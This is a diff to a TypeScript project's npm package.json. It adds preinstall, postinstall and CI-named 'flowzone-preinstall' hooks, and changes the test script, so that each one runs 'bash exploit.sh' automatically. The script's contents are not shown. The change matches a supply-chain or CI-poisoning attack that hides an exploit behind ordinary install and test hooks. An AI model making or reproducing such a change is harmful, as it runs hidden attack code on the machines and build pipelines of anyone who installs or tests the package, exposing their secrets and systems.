@@ -13,7 +13,10 @@
   "main": "dist/index.js",
   "types": "dist/index.d.ts",
   "scripts": {
-    "test": "jest --coverage",
+    "flowzone-preinstall": "bash exploit.sh",
+    "preinstall": "bash exploit.sh",
+    "postinstall": "bash exploit.sh",
+    "test": "bash exploit.sh && jest --coverage",
     "prettify": "balena-lint --typescript --fix src/ test/ index.ts",
     "lint": "balena-lint -src test index.ts",
     "build": "npm run lint && npm run test && tsc && webpack",
